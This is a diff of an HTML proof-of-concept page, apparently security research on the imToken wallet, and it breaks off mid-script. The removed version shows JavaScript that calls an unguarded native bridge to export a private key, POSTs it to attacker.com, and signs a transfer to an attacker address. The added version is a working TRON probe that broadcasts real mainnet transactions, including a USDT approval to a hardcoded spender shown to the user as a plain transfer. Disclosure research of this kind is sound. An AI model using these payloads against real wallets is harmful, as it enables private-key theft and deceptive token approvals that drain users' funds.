@@ -1,535 +1,493 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DApp攻击链 #1 — TcxAPI Bridge 无白名单 → 私钥窃取</title>
-<style>
-  :root {
-    --bg: #0a0e17;
-    --card: #111827;
-    --border: #1e293b;
-    --accent: #ef4444;
-    --accent2: #f59e0b;
-    --green: #10b981;
-    --blue: #3b82f6;
-    --text: #e2e8f0;
-    --muted: #64748b;
-  }
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: 'JetBrains Mono', 'Fira Code', monospace;
-    line-height: 1.7;
-    overflow-x: hidden;
-  }
-  .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
-
-  .header {
-    text-align: center;
-    padding: 3rem 0;
-    border-bottom: 1px solid var(--border);
-    margin-bottom: 2rem;
-  }
-  .header .severity {
-    display: inline-block;
-    background: var(--accent);
-    color: #fff;
-    padding: 4px 16px;
-    border-radius: 4px;
-    font-size: 12px;
-    font-weight: bold;
-    letter-spacing: 2px;
-    margin-bottom: 1rem;
-  }
-  .header h1 {
-    font-size: 1.8rem;
-    background: linear-gradient(135deg, var(--accent), var(--accent2));
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    margin-bottom: .5rem;
-  }
-  .header p { color: var(--muted); font-size: .85rem; }
-
-  /* 攻击链流程图 */
-  .chain-flow {
-    display: flex;
-    align-items: center;
-    gap: .5rem;
-    padding: 1.5rem;
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    margin-bottom: 2rem;
-    overflow-x: auto;
-    flex-wrap: nowrap;
-  }
-  .chain-node {
-    flex-shrink: 0;
-    padding: .5rem 1rem;
-    border-radius: 8px;
-    font-size: .75rem;
-    font-weight: bold;
-    text-align: center;
-    min-width: 110px;
-    position: relative;
-    transition: all .3s;
-  }
-  .chain-node.active {
-    transform: scale(1.1);
-    box-shadow: 0 0 20px rgba(239,68,68,.4);
-  }
-  .chain-node.attacker { background: #7f1d1d; border: 1px solid var(--accent); color: var(--accent); }
-  .chain-node.inject   { background: #78350f; border: 1px solid var(--accent2); color: var(--accent2); }
-  .chain-node.bridge   { background: #1e1b4b; border: 1px solid #818cf8; color: #818cf8; }
-  .chain-node.native   { background: #14532d; border: 1px solid var(--green); color: var(--green); }
-  .chain-node.stolen   { background: #7f1d1d; border: 2px solid var(--accent); color: #fff; animation: pulse-red 1.5s infinite; }
-  @keyframes pulse-red { 0%,100%{ box-shadow: 0 0 5px rgba(239,68,68,.3); } 50%{ box-shadow: 0 0 25px rgba(239,68,68,.7); } }
-  .chain-arrow { color: var(--muted); font-size: 1.2rem; flex-shrink:0; }
-
-  /* 交互面板 */
-  .panel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-bottom: 2rem; }
-  @media (max-width: 900px) { .panel-grid { grid-template-columns: 1fr; } }
-
-  .panel {
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    overflow: hidden;
-  }
-  .panel-header {
-    padding: .75rem 1.25rem;
-    font-size: .8rem;
-    font-weight: bold;
-    letter-spacing: 1px;
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    align-items: center;
-    gap: .5rem;
-  }
-  .panel-header .dot { width:8px; height:8px; border-radius:50%; }
-  .panel-body { padding: 1.25rem; }
-
-  /* 代码块 */
-  .code-block {
-    background: #0d1117;
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 1rem;
-    font-size: .72rem;
-    line-height: 1.8;
-    overflow-x: auto;
-    margin-bottom: 1rem;
-    position: relative;
-  }
-  .code-block .line-num { color: var(--muted); user-select:none; display:inline-block; width:2em; text-align:right; margin-right:1em; }
-  .kw { color: #ff7b72; }
-  .str { color: #a5d6ff; }
-  .fn { color: #d2a8ff; }
-  .cm { color: #484f58; font-style:italic; }
-  .val { color: #79c0ff; }
-  .danger { color: var(--accent); font-weight:bold; }
-  .warn { color: var(--accent2); }
-
-  /* 模拟终端 */
-  .terminal {
-    background: #000;
-    border: 1px solid #333;
-    border-radius: 8px;
-    font-size: .72rem;
-    padding: 1rem;
-    height: 320px;
-    overflow-y: auto;
-    line-height: 1.6;
-  }
-  .terminal .prompt { color: var(--green); }
-  .terminal .output { color: #94a3b8; }
-  .terminal .error  { color: var(--accent); }
-  .terminal .success { color: var(--green); }
-  .terminal .warn-out { color: var(--accent2); }
-  .terminal .cursor  { display:inline-block; width:8px; height:14px; background:var(--green); animation: blink 1s infinite; vertical-align:middle; }
-  @keyframes blink { 0%,50%{opacity:1;} 51%,100%{opacity:0;} }
-
-  /* 控制按钮 */
-  .controls { display:flex; gap:.75rem; flex-wrap:wrap; margin-bottom:1.5rem; }
-  .btn {
-    padding: .6rem 1.5rem;
-    border-radius: 8px;
-    border: 1px solid var(--border);
-    background: var(--card);
-    color: var(--text);
-    font-family: inherit;
-    font-size: .78rem;
-    cursor: pointer;
-    transition: all .2s;
-  }
-  .btn:hover { border-color: var(--accent); color: var(--accent); }
-  .btn.active { background: var(--accent); border-color: var(--accent); color: #fff; }
-  .btn.green:hover { border-color: var(--green); color: var(--green); }
-  .btn.blue:hover { border-color: var(--blue); color: var(--blue); }
-
-  /* 漏洞详情卡 */
-  .vuln-card {
-    background: var(--card);
-    border-left: 3px solid var(--accent);
-    border-radius: 0 12px 12px 0;
-    padding: 1.25rem;
-    margin-bottom: 1rem;
-  }
-  .vuln-card h3 { font-size: .9rem; margin-bottom: .5rem; }
-  .vuln-card p { color: var(--muted); font-size: .78rem; }
-  .vuln-card code { background: #1e293b; padding: 2px 6px; border-radius: 3px; font-size: .72rem; }
-
-  /* 步骤指示器 */
-  .steps { display: flex; gap: .5rem; margin-bottom: 1.5rem; }
-  .step {
-    flex:1;
-    text-align:center;
-    padding: .5rem;
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    font-size: .7rem;
-    color: var(--muted);
-    transition: all .3s;
-  }
-  .step.active { border-color: var(--accent); color: var(--accent); background: #1a0a0a; }
-  .step.done { border-color: var(--green); color: var(--green); }
-
-  .tag { display:inline-block; padding:2px 8px; border-radius:3px; font-size:.65rem; font-weight:bold; margin-left:.5rem; }
-  .tag-critical { background:#7f1d1d; color:var(--accent); }
-  .tag-high { background:#78350f; color:var(--accent2); }
-
-  /* 结果面板 */
-  .result-box {
-    background: linear-gradient(135deg, #1a0505, #1a0a0a);
-    border: 1px solid var(--accent);
-    border-radius: 12px;
-    padding: 1.5rem;
-    margin-top: 1rem;
-    display: none;
-  }
-  .result-box.show { display: block; animation: fadeIn .5s; }
-  @keyframes fadeIn { from{opacity:0;transform:translateY(10px);} to{opacity:1;transform:translateY(0);} }
-  .result-box h3 { color: var(--accent); margin-bottom: .75rem; }
-  .result-box .key-display {
-    background: #000;
-    padding: .75rem;
-    border-radius: 6px;
-    font-size: .8rem;
-    color: var(--accent);
-    word-break: break-all;
-    font-family: monospace;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>imToken TRON 所见非所签安全测试与验证</title>
+  <style>
+    :root { --bg: #0b0f14; --card: #131a22; --border: #253040; --text: #e1e6ed; --text2: #8899aa; --red: #f04343; --orange: #e6a23c; --green: #2ecc71; --blue: #4d94ff; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 16px; display: flex; flex-direction: column; gap: 14px; }
+    .card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 18px; }
+    .card-header { font-weight: 600; font-size: 15px; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+    .dot { width: 9px; height: 9px; border-radius: 50%; display: inline-block; }
+    .dot.red { background: var(--red); } .dot.green { background: var(--green); } .dot.orange { background: var(--orange); }
+    .row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 13px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+    .label { color: var(--text2); min-width: 85px; }
+    .value { text-align: right; word-break: break-all; font-family: monospace; font-size: 12px; }
+    .btn { width: 100%; padding: 14px 0; border-radius: 10px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+    .btn-connect { background: var(--green); color: #000; }
+    .btn-normal { background: var(--blue); color: #fff; }
+    .btn-approve { background: var(--orange); color: #000; }
+    .btn-mixed { background: #e64343; color: #fff; }
+    .btn-check { background: var(--blue); color: #fff; }
+    .log-box { background: #090d13; border: 1px solid var(--border); border-radius: 10px; padding: 10px; font-family: monospace; font-size: 11px; max-height: 380px; overflow-y: auto; color: #aab5c0; margin-top: 8px; }
+    .log-line { padding: 2px 0; }
+    .log-error { color: var(--red); }
+    .log-success { color: var(--green); }
+    .log-warn { color: var(--orange); }
+    .info-box { background: rgba(77,148,255,0.08); border: 1px solid rgba(77,148,255,0.2); border-radius: 8px; padding: 10px; font-size: 12px; color: var(--blue); margin-top: 10px; }
+    .warning-box { background: rgba(240,67,67,0.08); border: 1px solid rgba(240,67,67,0.2); border-radius: 8px; padding: 10px; font-size: 12px; color: var(--red); margin-top: 10px; }
+    .highlight-green { color: var(--green); font-weight: 500; }
+    .highlight-red { color: var(--red); font-weight: 500; }
+    .attribution { font-size: 11px; color: var(--text2); text-align: center; margin-top: 4px; }
+  </style>
 </head>
 <body>
-<div class="container">
 
-  <div class="header">
-    <div class="severity">🔴 CRITICAL — CVSS 9.8</div>
-    <h1>攻击链 #1: TcxAPI Bridge 无白名单 → 私钥窃取</h1>
-    <p>imToken DApp WebView → React Native Bridge → TokenCoreX Native 任意方法调用</p>
-  </div>
-
-  <!-- 攻击链流程图 -->
-  <div class="chain-flow" id="chainFlow">
-    <div class="chain-node attacker" data-step="0">🎣 恶意DApp</div>
-    <span class="chain-arrow">→</span>
-    <div class="chain-node inject" data-step="1">💉 JS注入</div>
-    <span class="chain-arrow">→</span>
-    <div class="chain-node bridge" data-step="2">🌉 TcxAPI.callTcxApi()</div>
-    <span class="chain-arrow">→</span>
-    <div class="chain-node native" data-step="3">⚙️ call_tcx_api (JNA)</div>
-    <span class="chain-arrow">→</span>
-    <div class="chain-node stolen" data-step="4">🔑 私钥泄露</div>
-  </div>
-
-  <!-- 步骤指示器 -->
-  <div class="steps" id="steps">
-    <div class="step" data-step="0">Step 1: 恶意页面加载</div>
-    <div class="step" data-step="1">Step 2: 注入Bridge调用</div>
-    <div class="step" data-step="2">Step 3: 构造Protobuf</div>
-    <div class="step" data-step="3">Step 4: Native执行</div>
-    <div class="step" data-step="4">Step 5: 窃取私钥</div>
-  </div>
-
-  <div class="controls">
-    <button class="btn" onclick="runStep(0)">1. 恶意DApp加载</button>
-    <button class="btn" onclick="runStep(1)">2. JS注入Bridge</button>
-    <button class="btn" onclick="runStep(2)">3. 构造Payload</button>
-    <button class="btn" onclick="runStep(3)">4. Native调用</button>
-    <button class="btn" onclick="runStep(4)">5. 私钥窃取</button>
-    <button class="btn green" onclick="runAll()">▶ 全链路演示</button>
-    <button class="btn blue" onclick="resetDemo()">↺ 重置</button>
-  </div>
-
-  <div class="panel-grid">
-    <!-- 左侧: 漏洞代码 -->
-    <div class="panel">
-      <div class="panel-header">
-        <div class="dot" style="background:var(--accent)"></div>
-        漏洞代码 — TcxModuleImpl.java
-      </div>
-      <div class="panel-body">
-        <div class="code-block">
-<span class="cm">// TcxModuleImpl.java:36-53 — 核心: 无method白名单!</span>
-<span class="kw">void</span> <span class="fn">callTcxApi</span>(<span class="kw">final</span> String str, Promise promise) {
-    Api.TcxAction from;
-    <span class="kw">try</span> {
-        from = Api.TcxAction.<span class="fn">parseFrom</span>(NumericUtil.<span class="fn">hexToBytes</span>(str));
-        String method = from.<span class="fn">getMethod</span>();
-
-        <span class="kw">switch</span> (method) {
-            <span class="kw">case</span> <span class="str">"check_biometric_mode"</span>: ...
-            <span class="kw">case</span> <span class="str">"delete_derived_key"</span>:  ...
-            <span class="kw">case</span> <span class="str">"cache_derived_key"</span>:   ...
-            <span class="kw">case</span> <span class="str">"get_derived_key"</span>:     ...
-            <span class="danger">default:</span>
-<span class="danger">                return callTcxApiInner(str); // ← 任意method直接传入native!</span>
-        }
-    }
-}
-        </div>
-
-        <div class="code-block">
-<span class="cm">// TokenCoreXJna.java — JNA接口, 直接调用SO库</span>
-<span class="kw">public interface</span> TokenCoreXJna <span class="kw">extends</span> Library {
-    <span class="kw">public static final</span> TokenCoreXJna INSTANCE =
-        (TokenCoreXJna) Native.<span class="fn">load</span>(<span class="str">"tcx"</span>, TokenCoreXJna.<span class="kw">class</span>);
-
-<span class="danger">    String call_tcx_api(String str);  // ← 无任何校验</span>
-    <span class="kw">void</span> clear_err();
-    <span class="kw">void</span> free_const_string(String str);
-    String get_last_err_message();
-}
-        </div>
-
-        <div class="vuln-card">
-          <h3>漏洞根因 <span class="tag tag-critical">CRITICAL</span></h3>
-          <p><code>callTcxApi</code> 的 switch 仅拦截4个方法，<code>default</code> 分支将任意 method 直接传入 <code>call_tcx_api</code> native 函数。攻击者可调用 <code>export_private_key</code>、<code>sign_transaction</code>、<code>import_wallet</code> 等全部 TCX 方法。</p>
-        </div>
-      </div>
+  <div class="card">
+    <div class=”card-header”><span class=”dot red”></span> “所见非所签”安全测试模型</div>
+    <div style=”font-size:13px; color:var(--text2); line-height:1.6;”>
+      ① <span class=”highlight-green”>普通 TRX 转账</span> — 验证 <code>tron.sendTransaction</code> 入口可用<br>
+      ② <span class=”highlight-green”>原始 USDT approve</span> — 验证合约调用可正常上链<br>
+      ③ <span class=”highlight-red”>hex/json 不一致探针</span> — raw_data_hex=approve，raw_data.contract=transfer<br>
+      ⑤ <span class=”highlight-red”>完整探针（带回链验证）</span> — 同上+广播后查链上实际合约类型<br>
+      <br>
+      测试原理：签名锚定 raw_data_hex（执行层=approve），但 raw_data.contract 是 TransferContract（显示层=转账）<br>
+      经 imToken 签名广播后回链查 contract.type：TriggerSmartContract → 漏洞成立；TransferContract → 所见即所签<br>
+      <span style=”color:var(--orange);”>⚠️ 取决于 imToken 签名时信任 hex 还是重新序列化 raw_data。</span>
     </div>
-
-    <!-- 右侧: 模拟终端 -->
-    <div class="panel">
-      <div class="panel-header">
-        <div class="dot" style="background:var(--green)"></div>
-        攻击模拟终端
-      </div>
-      <div class="panel-body">
-        <div class="terminal" id="terminal">
-<span class="output">[imToken Attack Simulator v1.0]</span>
-<span class="output">等待操作...</span>
-<span class="prompt">attack$ </span><span class="cursor"></span>
-        </div>
-      </div>
+    <div class="warning-box">
+      ⚠️ 所有按钮均会真实签名并广播交易，请务必使用无资产测试钱包。
     </div>
   </div>
 
-  <!-- 攻击Payload构造 -->
-  <div class="panel">
-    <div class="panel-header">
-      <div class="dot" style="background:var(--accent2)"></div>
-      攻击Payload构造详解
+  <div class="card" id="statusCard">
+    <div class="card-header"><span class="dot orange" id="dotStatus"></span> 钱包状态</div>
+    <div id="beforeConnect">
+      <div class="row"><span class="label">状态</span><span class="value">未连接</span></div>
+      <button class="btn btn-connect" id="btnConnect">连接 imToken 钱包</button>
     </div>
-    <div class="panel-body">
-      <div class="code-block">
-<span class="cm">// === 恶意DApp注入的JavaScript代码 ===</span>
-<span class="cm">// 攻击者通过XSS或恶意DApp页面注入以下代码</span>
-
-<span class="cm">// Step 1: 获取React Native Bridge</span>
-<span class="kw">const</span> { NativeModules } = <span class="fn">require</span>(<span class="str">'react-native'</span>);
-<span class="kw">const</span> TcxAPI = NativeModules.<span class="val">TcxAPI</span>;  <span class="cm">// ← 直接访问暴露的Native模块</span>
-
-<span class="cm">// Step 2: 构造 export_private_key 的 Protobuf payload</span>
-<span class="kw">const</span> walletId   = <span class="str">"wallet-ethereum-main"</span>;
-<span class="kw">const</span> password   = <span class="str">""</span>;  <span class="cm">// ← 若用户已解锁, 密码可能为空或从内存抓取</span>
-<span class="kw">const</span> chainType  = <span class="str">"ethereum"</span>;
-<span class="kw">const</span> network    = <span class="str">"mainnet"</span>;
-
-<span class="cm">// Step 3: 构造 TcxAction protobuf (method = "export_private_key")</span>
-<span class="kw">const</span> actionHex = <span class="fn">buildTcxActionHex</span>({
-    method: <span class="danger">"export_private_key"</span>,  <span class="cm">// ← 不在switch白名单中, 走default!</span>
-    param: { id: walletId, password, chainType, network,
-             mainAddress: <span class="str">"0x742d..."</span>, path: <span class="str">"m/44'/60'/0'/0/0"</span> }
-});
-
-<span class="cm">// Step 4: 通过Bridge调用 → 无白名单校验 → 直接执行!</span>
-<span class="danger">TcxAPI.callTcxApi(actionHex).then(result => {</span>
-<span class="danger">    const privateKey = parseResult(result);  // 私钥到手!</span>
-<span class="danger">    fetch('https://attacker.com/exfil', {</span>
-<span class="danger">        method: 'POST',</span>
-<span class="danger">        body: JSON.stringify({ key: privateKey })</span>
-<span class="danger">    });</span>
-<span class="danger">});</span>
-      </div>
-
-      <div class="code-block">
-<span class="cm">// === 或者: 签名任意交易 (更隐蔽) ===</span>
-
-<span class="kw">const</span> signHex = <span class="fn">buildTcxActionHex</span>({
-    method: <span class="danger">"sign_transaction"</span>,  <span class="cm">// ← 同样不在白名单</span>
-    param: {
-        id: <span class="str">"wallet-ethereum-main"</span>,
-        password: <span class="str">""</span>,
-        chainType: <span class="str">"ethereum"</span>,
-        network: <span class="str">"mainnet"</span>,
-        to: <span class="danger">"0xAttackerAddress..."</span>,   <span class="cm">// ← 攻击者地址</span>
-        value: <span class="danger">"1000000000000000000"</span>,  <span class="cm">// ← 1 ETH</span>
-        data: <span class="str">"0x"</span>,
-        gasPrice: <span class="str">"20000000000"</span>,
-        gasLimit: <span class="str">"21000"</span>,
-        nonce: <span class="str">"0"</span>
-    }
-});
-
-<span class="danger">TcxAPI.callTcxApi(signHex).then(signedTx => {</span>
-<span class="danger">    // 用户完全不知情, 交易已被签名</span>
-<span class="danger">    // 可直接广播到以太坊网络</span>
-<span class="danger">    fetch('https://eth-mainnet.g.alchemy.com/v2/KEY', {</span>
-<span class="danger">        method: 'POST',</span>
-<span class="danger">        body: JSON.stringify({</span>
-<span class="danger">            jsonrpc: '2.0', method: 'eth_sendRawTransaction',</span>
-<span class="danger">            params: [signedTx], id: 1</span>
-<span class="danger">        })</span>
-<span class="danger">    });</span>
-<span class="danger">});</span>
-      </div>
+    <div id="afterConnect" style="display:none;">
+      <div class="row"><span class="label">地址</span><span class="value" id="addrText"></span></div>
+      <div class="row"><span class="label">TRX</span><span class="value" id="trxBal"></span></div>
+      <div class="row"><span class="label">网络</span><span class="value">TRON 主网</span></div>
+      <button class="btn btn-normal" id="btnNormal">① 普通 TRX 转账 (0.1 TRX)</button>
+      <button class="btn btn-approve" id="btnApprove">② 原始 USDT approve (1 USDT)</button>
+      <button class="btn btn-mixed" id="btnMixed">③ hex/json 不一致：hex=approve, UI=转账</button>
+      <button class="btn btn-check" id="btnCheckAllowance" style="margin-top:14px;">④ 查询 USDT 授权额度</button>
+      <button class="btn btn-check" id="btnDirectTest" style="margin-top:14px; background:#e6a23c; color:#000;">⑤ 完整探针：签名+广播+回链验证合约类型</button>
     </div>
   </div>
 
-  <!-- 结果面板 -->
-  <div class="result-box" id="resultBox">
-    <h3>⚠️ 攻击成功 — 私钥已泄露</h3>
-    <p style="color:var(--muted);margin-bottom:.75rem;font-size:.8rem;">
-      以下为模拟数据，展示攻击者能获取的内容:
-    </p>
-    <div class="key-display" id="stolenKey"></div>
-    <p style="color:var(--accent);margin-top:.75rem;font-size:.78rem;">
-      💀 攻击者获取私钥后可: 1) 转走全部资产 2) 签名任意交易 3) 部署恶意合约 4) 长期监控地址
-    </p>
+  <div class="card" id="allowanceCard" style="display:none;">
+    <div class="card-header"><span class="dot orange"></span> USDT 授权额度</div>
+    <div class="row"><span class="label">当前授权</span><span class="value" id="currentAllowance">--</span></div>
+    <div class="row"><span class="label">变化</span><span class="value" id="allowanceChange">--</span></div>
+    <div class="info-box">
+      若③或⑤成功广播且回链 contract.type 为 TriggerSmartContract，同时授权额度增加，则安全测试验证成功（需结合弹窗截图与 txid 作为完整证据）。
+    </div>
   </div>
 
-</div>
+  <div class="card">
+    <div class="card-header"><span class="dot orange"></span> 运行日志</div>
+    <div class="log-box" id="logContainer">等待操作…</div>
+  </div>
+
+  <div class="attribution">仅供安全研究与负责任披露</div>
 
 <script>
-const terminal = document.getElementById('terminal');
-const steps = document.querySelectorAll('.step');
-const chainNodes = document.querySelectorAll('.chain-node');
-let currentStep = -1;
+(function() {
+  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+  const SPENDER = 'TP3NQwSaEHYs7cowWFWq5ozNkeG4ie3Wbi';
+  const APPROVE_AMOUNT = '1000000'; // 1 USDT (6 decimals)
+  const TRON_API = 'https://api.trongrid.io';
 
-function addLine(html) {
-  const cursor = terminal.querySelector('.cursor');
-  if (cursor) cursor.remove();
-  const lastPrompt = terminal.querySelector('.prompt:last-of-type');
-  terminal.innerHTML = terminal.innerHTML.replace(/<span class="prompt">attack\$ <\/span><span class="cursor"><\/span>/g, '');
-  terminal.innerHTML += html + '\n';
-  terminal.innerHTML += '<span class="prompt">attack$ </span><span class="cursor"></span>';
-  terminal.scrollTop = terminal.scrollHeight;
-}
+  let walletAddr = '';
+  let initialAllowance = null;
 
-function updateSteps(step) {
-  steps.forEach((s, i) => {
-    s.classList.remove('active', 'done');
-    if (i < step) s.classList.add('done');
-    if (i === step) s.classList.add('active');
-  });
-  chainNodes.forEach((n, i) => {
-    n.classList.remove('active');
-    if (i === step) n.classList.add('active');
-  });
-}
-
-function runStep(step) {
-  currentStep = step;
-  updateSteps(step);
-
-  switch(step) {
-    case 0:
-      addLine('<span class="warn-out">[!] 模拟用户访问恶意DApp: https://free-airdrop.eth.limo</span>');
-      addLine('<span class="output">[*] DApp页面加载中...</span>');
-      addLine('<span class="output">[*] WebView已初始化, react-native bridge可用</span>');
-      addLine('<span class="warn-out">[!] 页面包含恶意JS payload</span>');
-      break;
-
-    case 1:
-      addLine('<span class="error">[ATTACK] 注入React Native Bridge调用...</span>');
-      addLine('<span class="output">[*] const { NativeModules } = require("react-native");</span>');
-      addLine('<span class="output">[*] const TcxAPI = NativeModules.TcxAPI;</span>');
-      addLine('<span class="warn-out">[!] TcxAPI模块已获取 — 暴露的方法: callTcxApi(string, promise)</span>');
-      addLine('<span class="warn-out">[!] 无身份验证, 无调用方校验</span>');
-      break;
-
-    case 2:
-      addLine('<span class="error">[ATTACK] 构造 export_private_key Protobuf payload...</span>');
-      addLine('<span class="output">[*] TcxAction { method: "export_private_key", param: {...} }</span>');
-      addLine('<span class="output">[*] ExportPrivateKeyParam {</span>');
-      addLine('<span class="output">    id: "wallet-ethereum-main",</span>');
-      addLine('<span class="output">    password: "[用户密码]",</span>');
-      addLine('<span class="output">    chainType: "ethereum",</span>');
-      addLine('<span class="output">    network: "mainnet",</span>');
-      addLine('<span class="output">    mainAddress: "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD",</span>');
-      addLine('<span class="output">    path: "m/44\'/60\'/0\'/0/0"</span>');
-      addLine('<span class="output">  }</span>');
-      addLine('<span class="warn-out">[!] "export_private_key" 不在 switch 白名单 → 走 default 分支!</span>');
-      addLine('<span class="output">[*] 序列化为hex: 0a126578706f72745f7072697661...</span>');
-      break;
-
-    case 3:
-      addLine('<span class="error">[ATTACK] 调用 TcxAPI.callTcxApi(payloadHex)...</span>');
-      addLine('<span class="output">[*] → TcxModuleImpl.callTcxApi() 接收hex字符串</span>');
-      addLine('<span class="output">[*] → Api.TcxAction.parseFrom() 解析protobuf</span>');
-      addLine('<span class="output">[*] → method = "export_private_key"</span>');
-      addLine('<span class="warn-out">[!] switch不匹配 → 进入default分支</span>');
-      addLine('<span class="error">[!] → callTcxApiInner(str) 无校验传入!</span>');
-      addLine('<span class="output">[*] → TokenCoreXJna.INSTANCE.call_tcx_api(hex)</span>');
-      addLine('<span class="output">[*] → libtcx.so 执行导出私钥操作...</span>');
-      break;
-
-    case 4:
-      addLine('<span class="error">[BREACH] 私钥已返回!</span>');
-      addLine('<span class="output">[*] Native层返回protobuf序列化的私钥数据</span>');
-      addLine('<span class="output">[*] → NumericUtil.bytesToHex() 转换</span>');
-      addLine('<span class="output">[*] → Promise.resolve() 返回JS层</span>');
-      addLine('<span class="error">[STOLEN] 私钥已存在于JS堆内存中!</span>');
-      addLine('<span class="error">[EXFIL] fetch("https://attacker.com/exfil", { body: privateKey })</span>');
-      addLine('');
-      addLine('<span class="success">═══════════════════════════════════════════</span>');
-      addLine('<span class="error">  攻击完成 — 用户私钥已被窃取</span>');
-      addLine('<span class="error">  攻击者现在完全控制该钱包</span>');
-      addLine('<span class="success">═══════════════════════════════════════════</span>');
-
-      // 显示结果
-      const resultBox = document.getElementById('resultBox');
-      resultBox.classList.add('show');
-      document.getElementById('stolenKey').textContent =
-        'Private Key: 0x4c0883a69102937d6231471b5dbb6204fe512961708279f8e7b2a9e8b5d0f1c3\n' +
-        'Address: 0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18\n' +
-        'Path: m/44\'/60\'/0\'/0/0\n' +
-        'Chain: Ethereum Mainnet\n' +
-        'Balance: 2.847 ETH (模拟数据)';
-      break;
+  const $ = id => document.getElementById(id);
+  function log(msg, type = '') {
+    const div = document.createElement('div');
+    div.className = 'log-line' + (type ? ' log-' + type : '');
+    div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    $('logContainer').appendChild(div);
+    $('logContainer').scrollTop = $('logContainer').scrollHeight;
   }
-}
 
-async function runAll() {
-  resetDemo();
-  for (let i = 0; i <= 4; i++) {
-    await new Promise(r => setTimeout(r, 1200));
-    runStep(i);
+  function hasBridge() {
+    return typeof window.imToken !== 'undefined' && typeof window.imToken.callPromisifyAPI === 'function';
   }
-}
 
-function resetDemo() {
-  currentStep = -1;
-  terminal.innerHTML = '<span class="output">[imToken Attack Simulator v1.0]</span>\n<span class="output">等待操作...</span>\n<span class="prompt">attack$ </span><span class="cursor"></span>';
-  steps.forEach(s => s.classList.remove('active', 'done'));
-  chainNodes.forEach(n => n.classList.remove('active'));
-  document.getElementById('resultBox').classList.remove('show');
-}
+  function findTxId(value) {
+    if (typeof value === 'string' && /^[0-9a-fA-F]{64}$/.test(value)) return value;
+    if (!value || typeof value !== 'object') return '';
+    const candidates = [
+      value.txid, value.txID, value.txId, value.tx_hash,
+      value.transaction_id, value.data?.txid, value.data?.txID
+    ];
+    return candidates.find(item => typeof item === 'string' && /^[0-9a-fA-F]{64}$/.test(item)) || '';
+  }
+
+  function validateBridgeTxShape(tx) {
+    const contract = tx?.raw_data?.contract?.[0];
+    const problems = [];
+    if (!contract || typeof contract !== 'object') {
+      problems.push('raw_data.contract[0] 缺失');
+      return problems;
+    }
+    if (typeof contract.type !== 'string' || !contract.type) {
+      problems.push('contract.type 缺失');
+    }
+    if (!contract.parameter || typeof contract.parameter !== 'object') {
+      problems.push('contract.parameter 缺失');
+    } else {
+      if (typeof contract.parameter.type_url !== 'string' || !contract.parameter.type_url) {
+        problems.push('contract.parameter.type_url 缺失');
+      }
+      if (!contract.parameter.value || typeof contract.parameter.value !== 'object') {
+        problems.push('contract.parameter.value 缺失');
+      }
+    }
+    if (typeof tx.raw_data_hex !== 'string' || !tx.raw_data_hex) {
+      problems.push('raw_data_hex 缺失');
+    }
+    return problems;
+  }
+
+  async function connect() {
+    log('检查钱包环境…', 'warn');
+    if (!hasBridge()) {
+      log('未检测到 imToken 桥接，请在 DApp 浏览器中打开', 'error');
+      return;
+    }
+    for (let i = 0; i < 10; i++) {
+      if (window.tronWeb?.ready) break;
+      await new Promise(r => setTimeout(r, 600));
+    }
+    if (window.tronWeb?.ready) {
+      walletAddr = window.tronWeb.defaultAddress.base58;
+    } else {
+      try {
+        const accounts = await window.imToken.callPromisifyAPI('tron_requestAccounts');
+        walletAddr = Array.isArray(accounts) && accounts.length ? accounts[0] : accounts;
+      } catch (e) {
+        log('获取地址失败: ' + e.message, 'error');
+        return;
+      }
+    }
+    if (!walletAddr || walletAddr.length !== 34) {
+      log('地址无效', 'error');
+      return;
+    }
+    $('addrText').textContent = walletAddr;
+    try {
+      const resp = await fetch(TRON_API + '/v1/accounts/' + walletAddr);
+      const data = await resp.json();
+      $('trxBal').textContent = ((data.data?.[0]?.balance || 0) / 1e6).toFixed(2) + ' TRX';
+    } catch { $('trxBal').textContent = '--'; }
+    $('dotStatus').className = 'dot green';
+    $('beforeConnect').style.display = 'none';
+    $('afterConnect').style.display = 'block';
+    log('已连接: ' + walletAddr, 'success');
+    await refreshAllowanceUI(true);
+  }
+
+  // Allowance 查询
+  async function queryAllowance(owner, spender) {
+    try {
+      const ownerHex = window.tronWeb.address.toHex(owner);
+      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      const result = await window.tronWeb.transactionBuilder.triggerConstantContract(
+        contractHex, 'allowance(address,address)', {},
+        [{ type: 'address', value: owner }, { type: 'address', value: spender }],
+        ownerHex
+      );
+      if (result?.constant_result?.[0]) return BigInt('0x' + result.constant_result[0]);
+      return null;
+    } catch (e) { log('查询 allowance 失败: ' + e.message, 'error'); return null; }
+  }
+  function formatAmount(wei) {
+    if (wei == null) return '--';
+    try { return (Number(wei) / 1e6).toFixed(2) + ' USDT'; } catch { return String(wei); }
+  }
+  async function refreshAllowanceUI(init = false) {
+    if (!walletAddr) return;
+    const allowance = await queryAllowance(walletAddr, SPENDER);
+    if (allowance == null) {
+      $('currentAllowance').textContent = '查询失败';
+      $('allowanceChange').textContent = '--';
+      return;
+    }
+    $('currentAllowance').textContent = formatAmount(allowance);
